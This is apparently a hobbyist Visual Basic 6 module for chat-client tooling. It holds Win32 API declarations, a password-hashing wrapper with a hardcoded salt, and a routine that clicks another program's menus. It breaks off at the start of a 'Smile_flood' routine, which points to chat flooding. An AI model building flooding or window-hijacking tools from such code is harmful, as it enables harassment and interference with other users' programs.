Attribute VB_Name = "venkymd5crypt"
Global sa
'This is a module I compiled for you peeps TO LEARN from, IT IS NOT one I use I made my own totally, but I compiled this for you guys to leard from. Some was coded by me and some was coded by Unsakred... Have Fun - i_silent_i
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function venkymd5crypt Lib "venky.dll" (ByVal pass As String, ByVal salt As String, ByVal Ret As String) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Option Explicit
      #If Win32 Then

      #Else
        Private Declare Function sndPlaySound Lib "MMSYSTEM" ( _
                           lpszSoundName As Any, ByVal uFlags%) As Integer
      #End If
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, Source As Any, ByVal Length As Long)
Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function gettopwindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)

Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function PutFocus Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long

Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function ReleaseCapture Lib "user32" () As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SetFocusApi Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Declare Function SystemParametersInfo Lib _
"user32" Alias "SystemParametersInfoA" (ByVal uAction _
As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
ByVal fuWinIni As Long) As Long

Private Const SPI_SETSCREENSAVERRUNNING = 97
' For the 32 bit code that is generated with this spy
' to work, you will need to put these functions/consts
' in your module (*.bas file). Just Select it all,
' copy it, and paste it in.








Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Const BM_SETCHECK = &HF1
Public Const BM_GETCHECK = &HF0

Public Const CB_GETCOUNT = &H146
Public Const CB_GETLBTEXT = &H148
Public Const CB_SETCURSEL = &H14E

Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDNEXT = 2
Public Const GW_CHILD = 5

Public Const LB_GETCOUNT = &H18B
Public Const LB_GETTEXT = &H189
Public Const LB_SETCURSEL = &H186

Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_NORMAL = 1

Public Const VK_SPACE = &H20

Public Const WM_CHAR = &H102
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_GETTEXT1 = &HD
Public Const WM_MOVE = &HF012
Public Const WM_SYSCOMMAND = &H112

Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long


Const EM_UNDO = &HC7
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10
Public Const SND_MEMORY = &H4

Public Const WM_SETFOCUS = &H7

Public Const WM_USER = &H400





Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2



Public Const BM_GETSTATE = &HF2

Public Const BM_SETSTATE = &HF3
Public Const EWX_FORCE = 4
Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1
Public Const LB_GETITEMDATA = &H199

Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188

Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7

Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_TAB = &H9
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const Flags = SWP_NOMOVE Or SWP_NOSIZE
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SPI_SETDESKWALLPAPER = 20
Public Const SPIF_UPDATEINIFILE = 1


Public Const SW_ERASE = &H4
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const MF_SEPARATOR = &H800&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Public Const ENTA = 13
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Private Const EM_LINESCROLL = &HB6
Private Const SPI_SCREENSAVERRUNNING = 97



Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)




Public Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long


' <VB WATCH>
Const VBWMODULE = "venkymd5crypt"
' </VB WATCH>

Public Function getcrypt(passwd As String)
' <VB WATCH>
1          On Error GoTo vbwErrHandler
2          Const VBWPROCNAME = "venkymd5crypt.getcrypt"
3          If vbwTraceProc Then
4              Dim vbwParameterString As String
5              If vbwTraceParameters Then
6                  vbwParameterString = "(" & vbwReportParameter("passwd", passwd) & ") "
7              End If
8              vbwTraceIn VBWPROCNAME, vbwParameterString
9          End If
' </VB WATCH>

10     Dim ts As String
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "11     ts = Space$(50)"
' </VB WATCH>
11     ts = Space$(50)
12     Dim X As Long
13     Dim saltc As String
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "14     saltc = " & Chr(34) & "_2S43d5f" & Chr(34) & ""
' </VB WATCH>
14     saltc = "_2S43d5f"
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "15     X = venkymd5crypt(passwd, saltc, ts)"
' </VB WATCH>
15     X = venkymd5crypt(passwd, saltc, ts)
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "16     getcrypt = ts"
' </VB WATCH>
16     getcrypt = ts
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Function"
17         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
18         Exit Function
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "getcrypt"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Function"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Function

Private Function GetCaption(hwnd)
' <VB WATCH>
19         On Error GoTo vbwErrHandler
20         Const VBWPROCNAME = "venkymd5crypt.GetCaption"
21         If vbwTraceProc Then
22             Dim vbwParameterString As String
23             If vbwTraceParameters Then
24                 vbwParameterString = "(" & vbwReportParameter("hwnd", hwnd) & ") "
25             End If
26             vbwTraceIn VBWPROCNAME, vbwParameterString
27         End If
' </VB WATCH>
28     Dim hWndlength As Integer, hWndTitle As String, a As Integer
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "29     hWndlength% = GetWindowTextLength(hwnd)"
' </VB WATCH>
29     hWndlength% = GetWindowTextLength(hwnd)
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "30     hWndTitle$ = String$(hWndlength%, 0)"
' </VB WATCH>
30     hWndTitle$ = String$(hWndlength%, 0)
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "31     a% = GetWindowText(hwnd, hWndTitle$, (hWndlength% + 1))"
' </VB WATCH>
31     a% = GetWindowText(hwnd, hWndTitle$, (hWndlength% + 1))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "32     GetCaption = hWndTitle$"
' </VB WATCH>
32     GetCaption = hWndTitle$
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Function"
33         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
34         Exit Function
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "GetCaption"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Function"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Function
Sub ClickMenu(lngwindow As Long, strmenutext As String)
       'This is from Andymaul one of my closest friends
       'Thanks man.
' <VB WATCH>
35         On Error GoTo vbwErrHandler
36         Const VBWPROCNAME = "venkymd5crypt.ClickMenu"
37         If vbwTraceProc Then
38             Dim vbwParameterString As String
39             If vbwTraceParameters Then
40                 vbwParameterString = "(" & vbwReportParameter("lngwindow", lngwindow) & ", "
41                 vbwParameterString = vbwParameterString & vbwReportParameter("strmenutext", strmenutext) & ") "
42             End If
43             vbwTraceIn VBWPROCNAME, vbwParameterString
44         End If
' </VB WATCH>
45     Dim intLoop As Integer, intSubLoop As Integer, intSub2Loop As Integer, intSub3Loop As Integer, intSub4Loop As Integer
46     Dim lngmenu(1 To 5) As Long
47     Dim lngcount(1 To 5) As Long
48     Dim lngSubMenuID(1 To 4) As Long
49     Dim strcaption(1 To 4) As String

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "50         lngmenu(1) = GetMenu(lngwindow&)"
' </VB WATCH>
50         lngmenu(1) = GetMenu(lngwindow&)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "51         lngcount(1) = GetMenuItemCount(lngmenu(1))"
' </VB WATCH>
51         lngcount(1) = GetMenuItemCount(lngmenu(1))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "52             For intLoop% = 0 To lngcount(1) - 1"
' </VB WATCH>
52             For intLoop% = 0 To lngcount(1) - 1

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "53                 DoEvents"
' </VB WATCH>
53                 DoEvents

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "54                 lngmenu(2) = GetSubMenu(lngmenu(1), intLoop%)"
' </VB WATCH>
54                 lngmenu(2) = GetSubMenu(lngmenu(1), intLoop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "55                 lngcount(2) = GetMenuItemCount(lngmenu(2))"
' </VB WATCH>
55                 lngcount(2) = GetMenuItemCount(lngmenu(2))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "56                     For intSubLoop% = 0 To lngcount(2) - 1"
' </VB WATCH>
56                     For intSubLoop% = 0 To lngcount(2) - 1

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "57                         DoEvents"
' </VB WATCH>
57                         DoEvents

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "58                         lngSubMenuID(1) = GetMenuItemID(lngmenu(2), intSubLoop%)"
' </VB WATCH>
58                         lngSubMenuID(1) = GetMenuItemID(lngmenu(2), intSubLoop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "59                         strcaption(1) = String(75, " & Chr(34) & " " & Chr(34) & ")"
' </VB WATCH>
59                         strcaption(1) = String(75, " ")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "60                         Call GetMenuString(lngmenu(2), lngSubMenuID(1), strcaption(1), 75, 1)"
' </VB WATCH>
60                         Call GetMenuString(lngmenu(2), lngSubMenuID(1), strcaption(1), 75, 1)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "61                             If InStr(LCase(strcaption(1)), LCase(strmenutext$)) Then"
' </VB WATCH>
61                             If InStr(LCase(strcaption(1)), LCase(strmenutext$)) Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "62                                 Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(1), 0)"
' </VB WATCH>
62                                 Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(1), 0)

' <VB WATCH>
63         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "64                                 Exit Sub"
' </VB WATCH>
64                                 Exit Sub

65                             End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "65                             End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "66                         lngmenu(3) = GetSubMenu(lngmenu(2), intSubLoop%)"
' </VB WATCH>
66                         lngmenu(3) = GetSubMenu(lngmenu(2), intSubLoop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "67                         lngcount(3) = GetMenuItemCount(lngmenu(3))"
' </VB WATCH>
67                         lngcount(3) = GetMenuItemCount(lngmenu(3))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "68                             If lngcount(3) > 0 Then"
' </VB WATCH>
68                             If lngcount(3) > 0 Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "69                                 For intSub2Loop% = 0 To lngcount(3) - 1"
' </VB WATCH>
69                                 For intSub2Loop% = 0 To lngcount(3) - 1

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "70                                     DoEvents"
' </VB WATCH>
70                                     DoEvents

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "71                                     lngSubMenuID(2) = GetMenuItemID(lngmenu(3), intSub2Loop%)"
' </VB WATCH>
71                                     lngSubMenuID(2) = GetMenuItemID(lngmenu(3), intSub2Loop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "72                                     strcaption(2) = String(75, " & Chr(34) & " " & Chr(34) & ")"
' </VB WATCH>
72                                     strcaption(2) = String(75, " ")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "73                                     Call GetMenuString(lngmenu(3), lngSubMenuID(2), strcaption(2), 75, 1)"
' </VB WATCH>
73                                     Call GetMenuString(lngmenu(3), lngSubMenuID(2), strcaption(2), 75, 1)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "74                                         If InStr(LCase(strcaption(2)), LCase(strmenutext$)) Then"
' </VB WATCH>
74                                         If InStr(LCase(strcaption(2)), LCase(strmenutext$)) Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "75                                             Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(2), 0)"
' </VB WATCH>
75                                             Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(2), 0)

' <VB WATCH>
76         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "77                                             Exit Sub"
' </VB WATCH>
77                                             Exit Sub

78                                         End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "78                                         End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "79                                     lngmenu(4) = GetSubMenu(lngmenu(3), intSub2Loop%)"
' </VB WATCH>
79                                     lngmenu(4) = GetSubMenu(lngmenu(3), intSub2Loop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "80                                     lngcount(4) = GetMenuItemCount(lngmenu(4))"
' </VB WATCH>
80                                     lngcount(4) = GetMenuItemCount(lngmenu(4))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "81                                         If lngcount(4) > 0 Then"
' </VB WATCH>
81                                         If lngcount(4) > 0 Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "82                                             For intSub3Loop% = 0 To lngcount(4) - 1"
' </VB WATCH>
82                                             For intSub3Loop% = 0 To lngcount(4) - 1

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "83                                                 DoEvents"
' </VB WATCH>
83                                                 DoEvents

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "84                                                 lngSubMenuID(3) = GetMenuItemID(lngmenu(4), intSub3Loop%)"
' </VB WATCH>
84                                                 lngSubMenuID(3) = GetMenuItemID(lngmenu(4), intSub3Loop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "85                                                 strcaption(3) = String(75, " & Chr(34) & " " & Chr(34) & ")"
' </VB WATCH>
85                                                 strcaption(3) = String(75, " ")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "86                                                 Call GetMenuString(lngmenu(4), lngSubMenuID(3), strcaption(3), 75, 1)"
' </VB WATCH>
86                                                 Call GetMenuString(lngmenu(4), lngSubMenuID(3), strcaption(3), 75, 1)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "87                                                     If InStr(LCase(strcaption(3)), LCase(strmenutext$)) Then"
' </VB WATCH>
87                                                     If InStr(LCase(strcaption(3)), LCase(strmenutext$)) Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "88                                                         Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(3), 0)"
' </VB WATCH>
88                                                         Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(3), 0)

' <VB WATCH>
89         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "90                                                         Exit Sub"
' </VB WATCH>
90                                                         Exit Sub

91                                                     End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "91                                                     End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "92                                                 lngmenu(5) = GetSubMenu(lngmenu(4), intSub3Loop%)"
' </VB WATCH>
92                                                 lngmenu(5) = GetSubMenu(lngmenu(4), intSub3Loop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "93                                                 lngcount(5) = GetMenuItemCount(lngmenu(5))"
' </VB WATCH>
93                                                 lngcount(5) = GetMenuItemCount(lngmenu(5))

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "94                                                     If lngcount(5) > 0 Then"
' </VB WATCH>
94                                                     If lngcount(5) > 0 Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "95                                                         For intSub4Loop% = 0 To lngcount(5) - 1"
' </VB WATCH>
95                                                         For intSub4Loop% = 0 To lngcount(5) - 1

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "96                                                             DoEvents"
' </VB WATCH>
96                                                             DoEvents

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "97                                                             lngSubMenuID(4) = GetMenuItemID(lngmenu(5), intSub4Loop%)"
' </VB WATCH>
97                                                             lngSubMenuID(4) = GetMenuItemID(lngmenu(5), intSub4Loop%)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "98                                                             strcaption(4) = String(75, " & Chr(34) & " " & Chr(34) & ")"
' </VB WATCH>
98                                                             strcaption(4) = String(75, " ")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "99                                                             Call GetMenuString(lngmenu(5), lngSubMenuID(4), strcaption(4), 75, 1)"
' </VB WATCH>
99                                                             Call GetMenuString(lngmenu(5), lngSubMenuID(4), strcaption(4), 75, 1)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "100                                                                If InStr(LCase(strcaption(4)), LCase(strmenutext$)) Then"
' </VB WATCH>
100                                                                If InStr(LCase(strcaption(4)), LCase(strmenutext$)) Then

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "101                                                                    Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(4), 0)"
' </VB WATCH>
101                                                                    Call SendMessage(lngwindow&, WM_COMMAND, lngSubMenuID(4), 0)

' <VB WATCH>
102        If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "103                                                                    Exit Sub"
' </VB WATCH>
103                                                                    Exit Sub

104                                                                End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "104                                                                End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "105                                                        Next intSub4Loop%"
' </VB WATCH>
105                                                        Next intSub4Loop%

106                                                    End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "106                                                    End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "107                                            Next intSub3Loop%"
' </VB WATCH>
107                                            Next intSub3Loop%

108                                        End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "108                                        End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "109                                Next intSub2Loop%"
' </VB WATCH>
109                                Next intSub2Loop%

110                            End If
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "110                            End If" 'B
' </VB WATCH>

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "111                    Next intSubLoop%"
' </VB WATCH>
111                    Next intSubLoop%

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "112            Next intLoop%"
' </VB WATCH>
112            Next intLoop%

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
113        If vbwTraceProc Then vbwTraceOut VBWPROCNAME
114        Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "ClickMenu"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Public Sub Smile_flood()
' <VB WATCH>
115        On Error GoTo vbwErrHandler
116        Const VBWPROCNAME = "venkymd5crypt.Smile_flood"
117        If vbwTraceProc Then
118            Dim vbwParameterString As String
119            If vbwTraceParameters Then
120                vbwParameterString = "()"
121            End If
122            vbwTraceIn VBWPROCNAME, vbwParameterString
123        End If
' </VB WATCH>
' <VB WATCH>
